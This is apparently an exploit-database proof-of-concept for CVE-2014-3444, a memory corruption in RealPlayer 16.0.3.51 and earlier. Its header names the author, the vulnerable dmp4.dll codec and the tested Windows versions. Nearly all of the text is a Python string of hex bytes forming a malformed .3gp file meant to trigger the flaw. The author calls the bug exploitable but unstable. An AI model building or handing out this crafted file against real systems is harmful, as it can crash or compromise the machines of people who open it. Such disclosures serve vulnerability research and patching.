# Exploit Title: [Realplayer memory corruption in latest Version 16.0.3.51 ]
# Date: [2014/05/13]
# Exploit Author: [Aryan Bayaninejad]
# Linkedin : [https://www.linkedin.com/profile/view?id=276969082]
# Vendor Homepage: [www.real.com]
# Software Link: [
http://www.filehippo.com/download_realplayer/download/9b931239de41b8dce664656f25e1c28b/
]
# Version: [Version 16.0.3.51 and prior to that]
# Tested on: [Windows Xp Sp 3 x86, Windows 7 Sp1 x86]
# CVE : [CVE-2014-3444]

details:

Realplayer latest version 16.0.3.51 suffers from an  memory corruption
Vulnerability via  a malformed .3gp file format when

load RealPlayer\codecs\dmp4.dll .

####Note:it's Exploitable , But Not Stable.####


Poc:

#!/usr/bin/python
data
="\x00\x00\x00\x18\x66\x74\x79\x70\x33\x67\x70\x36\x00\x00\x01\x00\x69\x73\x6F\x6D\x33\x67\x70\x36\x00\x00

\x0F\x2D\x6D\x6F\x6F\x76\x00\x00\x00\x6C\x6D\x76\x68\x64\x00\x00\x00\x00\xCC\x8C\xBA\xF2\xCC\x8C\xBA\xF2\x00\x00\x02\x58

\x00\x00\x19\xFA\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x15\x69

\x6F\x64\x73\x00\x00\x00\x00\x10\x07\x00\x4F\xFF\xFF\x28\x08\xFF\x00\x00\x05\xA4\x74\x72\x61\x6B\x00\x00\x00\x5C\x74

\x6B\x68\x64\x00\x00\x00\x01\xCC\x8C\xBA\xF2\xCC\x8C\xBA\xF2\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x19\xFA\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\xB0\x00\x00\x00\x90\x00\x00\x00\x00\x05

\x40\x6D\x64\x69\x61\x00\x00\x00\x20\x6D\x64\x68\x64\x00\x00\x00\x00\xCC\x8C\xBA\xF2\xCC\x8C\xBA\xF2\x00\x00\x00\x0C\x00

\x00\x00\x85\x55\xC4\x00\x00\x00\x00\x00\x4C\x68\x64\x6C\x72\x00\x00\x00\x00\x00\x00\x00\x00\x76\x69\x64\x65\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x49\x73\x6F\x4D\x65\x64\x69\x61\x20\x46\x69\x6C\x65\x20\x50\x72\x6F\x64\x75\x63\x65

\x64\x20\x62\x79\x20\x47\x6F\x6F\x67\x6C\x65\x2C\x20\x35\x2D\x31\x31\x2D\x32\x30\x31\x31\x00\x00\x00\x04\xCC\x6D\x69

\x6E\x66\x00\x00\x00\x14\x76\x6D\x68\x64\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x24\x64\x69\x6E\x66

\x00\x00\x00\x1C\x64\x72\x65\x66\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0C\x75\x72\x6C\x20\x00\x00\x00\x01\x00\x00

\x04\x8C\x73\x74\x62\x6C\x00\x00\x00\xB8\x73\x74\x73\x64\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xA8\x6D\x70\x34\x76

\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xB0\x00\x90\x00\x48

\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\xFF\xFF\x00\x00\x00\x52\x65\x73\x64\x73\x00\x00\x00\x00

\x03\x44\x00\x00\x00\x04\x3C\x20\x11\x00\x07\x61\x00\x01\x19\xE8\x00\x00\xCD\xE0\x05\x2D\x00\x00\x01\xB0\x08\x00\x00\x01

\xB5\x89\x13\x00\x00\x01\x00\x00\x00\x01\x20\x00\xC4\x8D\x88\x00\x65\x05\x84\x12\x14\x63\x00\x00\x01\xB2\x4C\x61\x76\x63

\x35\x32\x2E\x34\x31\x2E\x30\x06\x01\x02\x00\x00\x00\x18\x73\x74\x74\x73\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x85

\x00\x00\x00\x01\x00\x00\x00\x1C\x73\x74\x73\x73\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x3D\x00\x00

\x00\x79\x00\x00\x01\x00\x73\x74\x73\x63\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x01

\x00\x00\x00\x02\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00

\x00\x06\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x06\x00\x00\x00\x01

\x00\x00\x00\x09\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x0A\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x0B\x00\x00

\x00\x05\x00\x00\x00\x01\x00\x00\x00\x0C\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x0D\x00\x00\x00\x05\x00\x00\x00\x01

\x00\x00\x00\x0E\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x10\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x11\x00\x00

\x00\x06\x00\x00\x00\x01\x00\x00\x00\x12\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x13\x00\x00\x00\x06\x00\x00\x00\x01

\x00\x00\x00\x14\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x15\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x17\x00\x00

\x00\x05\x00\x00\x00\x01\x00\x00\x00\x18\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x02\x28\x73\x74\x73\x7A\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x85\x00\x00\x07\x61\x00\x00\x00\xB6\x00\x00\x01\x72\x00\x00\x01\x70\x00\x00\x01\xDC\x00\x00

\x01\xFF\x00\x00\x02\x54\x00\x00\x02\x37\x00\x00\x02\x25\x00\x00\x02\x48\x00\x00\x02\x2C\x00\x00\x02\x3B\x00\x00\x02\x62

\x00\x00\x02\x4E\x00\x00\x02\x81\x00\x00\x02\xD9\x00\x00\x03\x05\x00\x00\x02\x5F\x00\x00\x03\x8B\x00\x00\x02\xDD\x00\x00

\x02\xB8\x00\x00\x02\xD7\x00\x00\x02\x90\x00\x00\x02\xA3\x00\x00\x02\x33\x00\x00\x02\x3E\x00\x00\x02\x2F\x00\x00\x02\x22

\x00\x00\x02\x31\x00\x00\x02\x0C\x00\x00\x02\x76\x00\x00\x01\xF4\x00\x00\x02\x03\x00\x00\x02\x22\x00\x00\x04\x27\x00\x00

\x02\x45\x00\x00\x02\x19\x00\x00\x02\x14\x00\x00\x03\x55\x00\x00\x02\x27\x00\x00\x01\xDF\x00\x00\x03\xDB\x00\x00\x02\x62

\x00\x00\x02\x20\x00\x00\x03\x5D\x00\x00\x01\xE6\x00\x00\x01\xE3\x00\x00\x03\xA0\x00\x00\x02\x3A\x00\x00\x02\x12\x00\x00

\x03\x4C\x00\x00\x01\xD4\x00\x00\x01\xD2\x00\x00\x01\xC5\x00\x00\x04\x0B\x00\x00\x02\x08\x00\x00\x01\xFA\x00\x00\x03\x68

\x00\x00\x01\xC6\x00\x00\x01\x94\x00\x00\x05\x5E\x00\x00\x00\xFD\x00\x00\x02\xF1\x00\x00\x03\xCC\x00\x00\x02\x4A\x00\x00

\x03\x47\x00\x00\x01\x71\x00\x00\x01\x77\x00\x00\x01\xA5\x00\x00\x01\x1D\x00\x00\x02\x31\x00\x00\x02\x6C\x00\x00\x02

\x5F\x00\x00\x02\x2A\x00\x00\x01\xD3\x00\x00\x02\x1D\x00\x00\x01\x71\x00\x00\x02\x04\x00\x00\x02\x7D\x00\x00\x01\x62\x00

\x00\x01\x9E\x00\x00\x01\x7D\x00\x00\x01\xBC\x00\x00\x01\xAD\x00\x00\x01\xDC\x00\x00\x01\x76\x00\x00\x01\xBF\x00\x00\x01

\x48\x00\x00\x01\xD7\x00\x00\x02\x29\x00\x00\x02\x03\x00\x00\x02\x7C\x00\x00\x01\x77\x00\x00\x01\x6F\x00\x00\x01\x2A\x00

\x00\x01\xE0\x00\x00\x01\x7E\x00\x00\x01\x72\x00\x00\x01\x81\x00\x00\x01\x90\x00\x00\x01\xC4\x00\x00\x01\x1B\x00\x00\x01

\x73\x00\x00\x02\x02\x00\x00\x01\x36\x00\x00\x01\x5A\x00\x00\x01\x8C\x00\x00\x02\x1B\x00\x00\x01\xB7\x00\x00\x01\xC2\x00

\x00\x01\xAC\x00\x00\x01\xDA\x00\x00\x01\x8B\x00\x00\x01\x63\x00\x00\x01\xB5\x00\x00\x01\x76\x00\x00\x01\x52\x00\x00\x01

\x84\x00\x00\x01\x6C\x00\x00\x01\xBF\x00\x00\x06\x65\x00\x00\x01\x86\x00\x00\x02\x03\x00\x00\x00\xEF\x00\x00\x01\xE1\x00

\x00\x03\x13\x00\x00\x02\x40\x00\x00\x01\x86\x00\x00\x01\xB0\x00\x00\x01\xD1\x00\x00\x01\x78\x00\x00\x01\xE5\x00\x00\x01

\xD6\x00\x00\x00\x70\x73\x74\x63\x6F\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x0F\x4D\x00\x00\x27\x20\x00\x00\x39\xD5\x00

\x00\x4F\xCF\x00\x00\x62\xBA\x00\x00\x75\x1D\x00\x00\x87\x37\x00\x00\x9A\x85\x00\x00\xAF\x7B\x00\x00\xC2\x04\x00\x00\xD6

\x7D\x00\x00\xE8\xA2\x00\x00\xFC\x16\x00\x01\x0B\xC2\x00\x01\x1C\x5D\x00\x01\x2B\x87\x00\x01\x3A\x12\x00\x01\x49\x8D\x00

\x01\x56\x5B\x00\x01\x65\x6C\x00\x01\x73\x63\x00\x01\x81\x9E\x00\x01\x95\x8F\x00\x01\xA5\x54\x00\x00\x06\x0D\x74\x72\x61

\x6B\x00\x00\x00\x5C\x74\x6B\x68\x64\x00\x00\x00\x01\xCC\x8C\xBA\xF2\xCC\x8C\xBA\xF2\x00\x00\x00\x02\x00\x00\x00\x00\x00

\x00\x19\xE7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x05\xA9\x6D\x64\x69\x61\x00\x00\x00\x20\x6D\x64\x68\x64\x00\x00\x00\x00\xCC\x8C\xBA\xF2

\xCC\x8C\xBA\xF2\x00\x00\x56\x22\x00\x03\xB8\x00\x55\xC4\x00\x00\x00\x00\x00\x4C\x68\x64\x6C\x72\x00\x00\x00\x00\x00\x00

\x00\x00\x73\x6F\x75\x6E\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x49\x73\x6F\x4D\x65\x64\x69\x61\x20\x46\x69

\x6C\x65\x20\x50\x72\x6F\x64\x75\x63\x65\x64\x20\x62\x79\x20\x47\x6F\x6F\x67\x6C\x65\x2C\x20\x35\x2D\x31\x31\x2D\x32\x30

\x31\x31\x00\x00\x00\x05\x35\x6D\x69\x6E\x66\x00\x00\x00\x10\x73\x6D\x68\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x24\x64\x69\x6E\x66\x00\x00\x00\x1C\x64\x72\x65\x66\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0C\x75\x72\x6C\x20\x00

\x00\x00\x01\x00\x00\x04\xF9\x73\x74\x62\x6C\x00\x00\x00\x69\x73\x74\x73\x64\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00

\x59\x6D\x70\x34\x61\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x00\x00\x00\x00\x56

\x22\x00\x00\x00\x00\x00\x35\x65\x73\x64\x73\x00\x00\x00\x00\x03\x27\x00\x00\x00\x04\x1F\x40\x15\x00\x00\xD4\x00\x00\x68

\x50\x00\x00\x5D\xF8\x05\x10\x13\x88\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x01\x02\x00\x00\x00\x18

\x73\x74\x74\x73\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xEE\x00\x00\x04\x00\x00\x00\x00\x34\x73\x74\x73\x63\x00\x00

\x00\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x0A\x00\x00\x00\x01

\x00\x00\x00\x18\x00\x00\x00\x07\x00\x00\x00\x01\x00\x00\x03\xCC\x73\x74\x73\x7A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\xEE\x00\x00\x00\x8B\x00\x00\x00\x8B\x00\x00\x00\xD4\x00\x00\x00\xB2\x00\x00\x00\xA4\x00\x00\x00\x91\x00\x00\x00\x90

\x00\x00\x00\x92\x00\x00\x00\x90\x00\x00\x00\x92\x00\x00\x00\x96\x00\x00\x00\x89\x00\x00\x00\x82\x00\x00\x00\x84\x00\x00

\x00\x9A\x00\x00\x00\x8B\x00\x00\x00\x92\x00\x00\x00\x89\x00\x00\x00\x80\x00\x00\x00\x7B\x00\x00\x00\x7E\x00\x00\x00\x87

\x00\x00\x00\x90\x00\x00\x00\x88\x00\x00\x00\x82\x00\x00\x00\x82\x00\x00\x00\x81\x00\x00\x00\x9D\x00\x00\x00\x9A\x00\x00

\x00\x88\x00\x00\x00\x80\x00\x00\x00\x87\x00\x00\x00\x84\x00\x00\x00\x88\x00\x00\x00\x8A\x00\x00\x00\x82\x00\x00\x00\x85

\x00\x00\x00\x8F\x00\x00\x00\x8B\x00\x00\x00\x84\x00\x00\x00\x8A\x00\x00\x00\x88\x00\x00\x00\x8A\x00\x00\x00\x8C\x00\x00

\x00\x8C\x00\x00\x00\x85\x00\x00\x00\x95\x00\x00\x00\x88\x00\x00\x00\x87\x00\x00\x00\x8F\x00\x00\x00\x82\x00\x00\x00\x88

\x00\x00\x00\x93\x00\x00\x00\x8A\x00\x00\x00\x92\x00\x00\x00\x86\x00\x00\x00\x88\x00\x00\x00\x89\x00\x00\x00\x86\x00\x00

\x00\x89\x00\x00\x00\x87\x00\x00\x00\x8B\x00\x00\x00\x94\x00\x00\x00\x8A\x00\x00\x00\x89\x00\x00\x00\x89\x00\x00\x00\x88

\x00\x00\x00\x8E\x00\x00\x00\x8E\x00\x00\x00\x8D\x00\x00\x00\x95\x00\x00\x00\x8D\x00\x00\x00\x86\x00\x00\x00\x8E\x00\x00

\x00\x87\x00\x00\x00\x8C\x00\x00\x00\x8C\x00\x00\x00\x8E\x00\x00\x00\x91\x00\x00\x00\x89\x00\x00\x00\x8B\x00\x00\x00\x90

\x00\x00\x00\x85\x00\x00\x00\x8E\x00\x00\x00\x8E\x00\x00\x00\x8E\x00\x00\x00\x8B\x00\x00\x00\x8B\x00\x00\x00\x90\x00\x00

\x00\x8D\x00\x00\x00\x8B\x00\x00\x00\x8C\x00\x00\x00\x88\x00\x00\x00\x93\x00\x00\x00\x89\x00\x00\x00\x90\x00\x00\x00\x84

\x00\x00\x00\x90\x00\x00\x00\x7F\x00\x00\x00\x8A\x00\x00\x00\x90\x00\x00\x00\x8D\x00\x00\x00\x8C\x00\x00\x00\x8D\x00\x00

\x00\x93\x00\x00\x00\x7B\x00\x00\x00\x94\x00\x00\x00\x8A\x00\x00\x00\x8D\x00\x00\x00\x95\x00\x00\x00\x8B\x00\x00\x00\x98

\x00\x00\x00\x8F\x00\x00\x00\x8B\x00\x00\x00\x89\x00\x00\x00\x8F\x00\x00\x00\x87\x00\x00\x00\x8B\x00\x00\x00\x90\x00\x00

\x00\x9B\x00\x00\x00\x83\x00\x00\x00\x89\x00\x00\x00\x84\x00\x00\x00\x84\x00\x00\x00\x8C\x00\x00\x00\x85\x00\x00\x00

\x8E\x00\x00\x00\x95\x00\x00\x00\x92\x00\x00\x00\x8E\x00\x00\x00\x84\x00\x00\x00\x8B\x00\x00\x00\x8A\x00\x00\x00\x89\x00

\x00\x00\x82\x00\x00\x00\x8B\x00\x00\x00\x8B\x00\x00\x00\x86\x00\x00\x00\x8A\x00\x00\x00\x81\x00\x00\x00\x90\x00\x00\x00

\x85\x00\x00\x00\x88\x00\x00\x00\x8E\x00\x00\x00\x93\x00\x00\x00\x91\x00\x00\x00\x85\x00\x00\x00\x81\x00\x00\x00\x81\x00

\x00\x00\x85\x00\x00\x00\x89\x00\x00\x00\x84\x00\x00\x00\x8F\x00\x00\x00\x89\x00\x00\x00\x87\x00\x00\x00\x8F\x00\x00\x00

\x90\x00\x00\x00\x8F\x00\x00\x00\x86\x00\x00\x00\xA1\x00\x00\x00\x89\x00\x00\x00\x8B\x00\x00\x00\x81\x00\x00\x00\x91\x00

\x00\x00\x8C\x00\x00\x00\x8D\x00\x00\x00\x92\x00\x00\x00\xAE\x00\x00\x00\x8B\x00\x00\x00\x89\x00\x00\x00\x87\x00\x00\x00

\x8F\x00\x00\x00\x85\x00\x00\x00\x90\x00\x00\x00\x8E\x00\x00\x00\x8E\x00\x00\x00\x8A\x00\x00\x00\x82\x00\x00\x00\x8B\x00

\x00\x00\x86\x00\x00\x00\x8F\x00\x00\x00\x88\x00\x00\x00\x82\x00\x00\x00\x8C\x00\x00\x00\x97\x00\x00\x00\x86\x00\x00\x00

\x85\x00\x00\x00\x8C\x00\x00\x00\x89\x00\x00\x00\x90\x00\x00\x00\x88\x00\x00\x00\x8C\x00\x00\x00\x99\x00\x00\x00\x8E\x00

\x00\x00\x87\x00\x00\x00\x7F\x00\x00\x00\x85\x00\x00\x00\x8C\x00\x00\x00\x86\x00\x00\x00\x8D\x00\x00\x00\x90\x00\x00\x00

\x83\x00\x00\x00\x8F\x00\x00\x00\x91\x00\x00\x00\x9A\x00\x00\x00\x88\x00\x00\x00\x89\x00\x00\x00\x84\x00\x00\x00\x8B\x00

\x00\x00\x87\x00\x00\x00\x87\x00\x00\x00\x85\x00\x00\x00\x93\x00\x00\x00\x85\x00\x00\x00\x8C\x00\x00\x00\x99\x00\x00\x00

\x8A\x00\x00\x00\x89\x00\x00\x00\x88\x00\x00\x00\x8A\x00\x00\x00\x8D\x00\x00\x00\x82\x00\x00\x00\x8C\x00\x00\x00\x8B\x00

\x00\x00\x8B\x00\x00\x00\x84\x00\x00\x00\x88\x00\x00\x00\x95\x00\x00\x00\x8D\x00\x00\x00\x8C\x00\x00\x00\x8D\x00\x00\x00

\x90\x00\x00\x00\x8D\x00\x00\x00\x88\x00\x00\x00\x8E\x00\x00\x00\x91\x00\x00\x00\x98\x00\x00\x00\x88\x00\x00\x00\x70\x73

\x74\x63\x6F\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x20\x75\x00\x00\x34\x8D\x00\x00\x4A\x6C\x00\x00\x5D\x6E\x00\x00

\x6F\xB9\x00\x00\x81\xD3\x00\x00\x95\x04\x00\x00\xAA\x08\x00\x00\xBC\x87\x00\x00\xD1\x10\x00\x00\xE3\x23\x00\x00\xF6

\x8C\x00\x01\x06\x59\x00\x01\x17\x06\x00\x01\x26\x33\x00\x01\x34\x91\x00\x01\x43\xFC\x00\x01\x50\xEF\x00\x01\x60\x07\x00

\x01\x6D\xF6\x00\x01\x7C\x33\x00\x01\x90\x1B\x00\x01\x9F\xE9\x00\x01\xAA\x87\x00\x00\x02\xF3\x75\x64\x74\x61\x00\x00\x02

\xEB\x6D\x65\x74\x61\x00\x00\x00\x00\x00\x00\x00\x21\x68\x64\x6C\x72\x00\x00\x00\x00\x00\x00\x00\x00\x6D\x64\x69\x72\x61

\x70\x70\x6C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\xBE\x69\x6C\x73\x74\x00\x00\x00\x19\x67\x73\x73\x74\x00\x00

\x00\x11\x64\x61\x74\x61\x00\x00\x00\x01\x00\x00\x00\x00\x30\x00\x00\x00\x1D\x67\x73\x74\x64\x00\x00\x00\x15\x64\x61\x74

\x61\x00\x00\x00\x01\x00\x00\x00\x00\x31\x31\x31\x39\x31\x00\x00\x00\x38\x67\x73\x73\x64\x00\x00\x00\x30\x64\x61\x74\x61

\x00\x00\x00\x01\x00\x00\x00\x00\x42\x42\x43\x35\x44\x41\x45\x30\x37\x48\x48\x31\x33\x34\x39\x33\x37\x31\x38\x39\x31\x39

\x32\x31\x35\x30\x33\x00\x00\x00\x00\x00\x00\x00\x00\x98\x67\x73\x70\x75\x00\x00\x00\x90\x64\x61\x74\x61\x00\x00\x00\x01

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98\x67\x73\x70\x6D\x00\x00\x00\x90\x64\x61\x74\x61\x00\x00

\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x18\x67\x73\x68\x68\x00\x00\x01\x10\x64\x61\x74\x61

\x00\x00\x00\x01\x00\x00\x00\x00\x6F\x2D\x6F\x2D\x2D\x2D\x70\x72\x65\x66\x65\x72\x72\x65\x64\x2D\x2D\x2D\x73\x6E\x2D\x61

\x30\x6A\x70\x6D\x2D\x61\x30\x6D\x65\x2D\x2D\x2D\x76\x32\x30\x2D\x2D\x2D\x6C\x73\x63\x61\x63\x68\x65\x37\x2E\x63\x2E\x79

\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x9F\x26\x6D\x64

\x61\x74\x00\x00\x01\xB3\x00\x10\x07\x00\x00\x01\xB6\x10\xC3\x63\x0A\x8D\xBF\x8D\xB6\xFE\x36\xDB\xF8\xDB\x6F\xE3

\x6D\xBF\x8D\xB6\xFE\x36\xDB\xF8\xDB\x6F\xE3\x6D\xBF\x8D\xB6\xFE\x36\xDB\xF1\x36\xA1\x6E\x1B\x17\x50\x91\x96\xE1\xB1\x73

\xCE\xCB\xD9\xDE\x58\x49\x51\xBA\x59\xA4\xAA\xCF\xA2\x3A\x2E\xD0\x93\x0E\x7C\x6C\x5D\x42\x4A\xD3\x93\x16\xE1\xB1\x75\x09

\x19\x6E\x1B\x17\x3F\x7E\x48\xCB\x70\xD8\x52\xCB\x70\xD8\x53\x9C\xE8\x65\xB8\x6C\x29\xA1\x05\xAE\xF1\x4A\xFC\x52\x8A\xA2

\x44\x8F\x87\xBA\xCD\xB5\x7E\xB4\xB2\x1B\x58\x8F\xE6\xE1\xFB\x5D\x50\xA5\x72\x8D\x42\x26\x82\xDC\x36\x14\xC8\xE0

\x3D\x2D\xE9\xA5\x85\x09\x7C\x8C\xB7\x0D\x8B\x9F\x94\xE1\xB0\xA7\x69\x24\x6A\x70\xD8\x52\xD4\xE1\xB0\xA5\xBE\xCD\xCB\x70

\xD8\x53\x94\xE1\xB0\xA5\xA1\x82\x79\xF9\x1A\x97\x35\x2E\xCF\x92\x35\x2E\x6A\x5C\xF7\x8B\x2A\xDE\x1D\xB9\xB2\x90\xD1

\xFB\x92\x4E\x86\x41\x26\x60\x29\x77\xBE\x6C\x6E\xEA\x0B\x24\xE7\x0D\x10\xC2\x9D\x02\x14\x68\xD9\xF2\xBF\x48\x44\xDC\xB7

\xE0\x42\x8D\x39\x6E\xF4\x6D\x46\x93\x3E\x2F\x63\x37\xD5\xFA\x81\x46\x0F\x7A\x36\x39\x83\xD3\x41\x5C\x97\xC1\x8F\xE1\x06

\x2C\x4F\x7B\xE6\x68\xDA\xFB\x29\x2A\xE1\x33\x0F\x99\x51\x9D\x66\x29\x43\x73\xD0\xED\x4B\x90\xB6\xCF\xA0\x58\x1B\xD0

\xAB\xEE\xB1\xE5\xBE\xDC\xCB\xC4\x57\x64\x58\x51\xF5\xCB\x3E\xB8\x32\x91\xE6\x03\x01\x59\x4A\x27\xF4\x32\x30\x9B\x05

\xEA\x95\xD5\x0D\x5E\xD4\x68\xAC\x0A\x7E\x46\x7F\x1F\x29\xA4\x85\x07\xBE\xD7\x8F\x36\xE5\x8F\x37\xF8\x0B\xCD\x82\xAD\x20

\x73\x69\x47\xB4\x24\x9F\x17\xB1\xF6\xE3\x50\xB7\xB4\xDC\x92\x22\xE9\x39\xB2\xCE\x50\x60\x29\x09\x4B\x3A\x14\xA1\x93\xA8

\x9B\x5C\x18\xA2\x60\x64\x75\x94\x4C\xD2\x49\x8C\x00\xD3\x76\xCE\xB3\x4D\xEF\x2E\xA2\xE9\x04\x88\x0D\x4B\x73\x66\xD9

\xAB\x76\xFF\x5F\xAE\x4C\xCB\x93\x08\x97\xC5\x1A\xF6\x7B\xB3\xD3\x93\xA1\x32\x68\x82\xCA\xDA\x78\x68\x3D\x4A\xCB\x53\xC5

\x96\x4E\xDB\x2A\xD2\x85\x2A\x05\xE6\x44\xB0\xEB\xC0\xAF\x09\xB5\x12\xA3\x04\xC3\xD4\xBF\x57\x26\xB3\x6C\x5D\x62\xA9\x05

\xCE\x0A\x87\x12\x03\x07\x7E\x29\xA1\x93\xFC\x82\x7F\x8C\xCB\xE7\x6D\x0D\x30\x27\x69\x2B\xCE\xDA\x1A\x06\x0F\xB4\x58\x79

\x26\x76\x7C\x35\x3C\x4D\x22\xA5\x09\x4B\x71\x68\x59\xB2\xC1\xA6\x11\x97\x8C\x82\xBE\x05\x04\x1A\x85\x62\x67\x91\x89

\x9B\x69\x63\x7D\xBB\xC7\x9F\xD7\x8F\xB7\xE5\x16\xCD\xD9\x6C\x5B\xF6\xA1\x51\x08\xD6\x8D\xF9\x4F\x31\xAB\x74\xA6\x10\xD7

\x5B\x9B\x97\x3D\xBC\xE0\xD3\x28\xCC\x6F\x1B\x5A\x77\x61\x6C\xE9\x2F\x42\xD4\x56\xCB\x29\x67\xB9\x0B\x32\x76\x2C\xA7\xE7

\x1D\xF2\x55\x39\x3A\xAA\x29\xEA\x0B\xA4\x51\x55\xA6\x1C\x16\x7F\x57\x86\x97\x3D\x71\x3F\x14\x0D\xF7\x92\xF0\x3C\x47\xD1

